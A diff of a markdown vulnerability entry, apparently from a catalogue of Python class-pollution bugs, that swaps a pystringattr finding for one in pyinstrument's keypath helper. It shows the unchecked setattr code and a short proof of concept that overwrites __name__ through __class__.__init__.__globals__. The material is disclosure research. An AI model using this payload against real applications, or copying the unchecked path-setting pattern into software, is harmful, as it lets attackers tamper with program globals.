@@ -1,57 +1,62 @@
-## pystringattr
+## pyinstrument
 
 ### Meta
 
-+ Library: pystringattr
-+ Stars: 2
++ Library: pyinstrument
++ Stars: 6.8K
 + Version: N/A
 + CVE: N/A
 + Status: Pending
-+ Payload: ```pystringattr.setstrattr(obj, '__init__.__globals__["__name__"]', 'polluted')```
-+ Foundby: Zhong
++ Payload: ```pyinstrument.vendor.keypath.set_value_at_keypath(obj, '__class__.__init__.__globals__.__name__', 'polluted')```
++ Foundby: BlackPyrl
 + Report: Pending
 + Type: Lib
-+ Exploitability: High
++ Exploitability: Low
 
 ### Library
 
-https://github.com/dansimau/pystringattr
+https://github.com/joerick/pyinstrument
 
 ### Vulnerable Code Snippet
 
 ```python
-def set(self, base_obj, value, string_attr_path=None):
-    """Set value on an object structure using string representation
-    of attributes path."""
-    if string_attr_path is not None:
-        stack = self._parse(string_attr_path)
+
+def set_value_at_keypath(obj: Any, keypath: str, val: Any):
+  """
+  Sets value at given key path which follows dotted-path notation.
+
+  Each part of the keypath must already exist in the target value
+  along the path.
+
+    >>> x = dict(a=1, b=2, c=dict(d=3, e=4, f=[2,dict(x='foo', y='bar'),5]))
+    >>> assert set_value_at_keypath(x, 'a', 2)
+    >>> assert value_at_keypath(x, 'a') == 2
+    >>> assert set_value_at_keypath(x, 'c.f.-1', 6)
+    >>> assert value_at_keypath(x, 'c.f.-1') == 6
+  """
+  parts = keypath.split('.')
+  for part in parts[:-1]:
+    if isinstance(obj, dict):
+      obj = obj[part]
+    elif type(obj) in [tuple, list]:
+      obj = obj[int(part)]
     else:
-        string_attr_path = self._string_attr_path
-        stack = self._stack
-
-    # Get the name of the attribute we're setting (the last item in
-    # the stack)
-    attr = stack.pop()
-
-    # Get the actual object we're going to operate on
-    target_obj = self._get(base_obj, stack)
-
-    # Set the attribute or key value
-    if attr.access_method == AccessorType.INDEX:
-        target_obj[attr.name] = value
-    else:
-        setattr(target_obj, attr.name, value)
-
-
-def setstrattr(obj, attr, val):
-    """Set value on an object structure using string representation
-    of attributes path."""
-    return StringAttribute().set(obj, val, attr)
+      obj = getattr(obj, part)
+  last_part = parts[-1]
+  if isinstance(obj, dict):
+    obj[last_part] = val
+  elif type(obj) in [tuple, list]:
+    obj[int(last_part)] = val
+  else:
+    setattr(obj, last_part, val)
+  return True
 ```
 ### PoC
 
 ```python
-import pystringattr
+from pyinstrument.vendor.keypath import set_value_at_keypath
+
+
 import random
 class Animal:
   def __init__(self, typ, age):
@@ -60,7 +65,7 @@ class Animal:
       self.id = random.randint(1, 99999)
 
 obj = Animal('cat', 11)
-pystringattr.setstrattr(obj, '__init__.__globals__["__name__"]', 'polluted')
+set_value_at_keypath(obj, '__class__.__init__.__globals__.__name__', 'polluted')
 
 print(__name__)
 ```
